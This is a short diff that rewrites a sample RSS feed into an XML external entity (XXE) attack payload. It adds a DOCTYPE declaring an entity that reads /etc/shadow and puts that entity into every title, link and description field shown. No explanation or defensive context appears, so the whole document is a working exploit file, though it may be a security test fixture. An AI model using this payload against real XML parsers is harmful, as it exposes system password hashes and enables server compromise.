@@ -1,14 +1,15 @@
 <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
 <rss version="2.0">
 
 <channel>
-  <title>W3Schools Home Page</title>
-  <link>https://www.w3schools.com</link>
-  <description>Free web building tutorials</description>
+  <title>&xxe;</title>
+  <link>&xxe;</link>
+  <description>&xxe;</description>
   <item>
-    <title>RSS Tutorial</title>
-    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
-    <description>New RSS tutorial on W3Schools</description>
+    <title>&xxe;</title>
+    <link>&xxe;</link>
+    <description>&xxe;</description>
   </item>
   <item>
     <title>XML Tutorial</title>
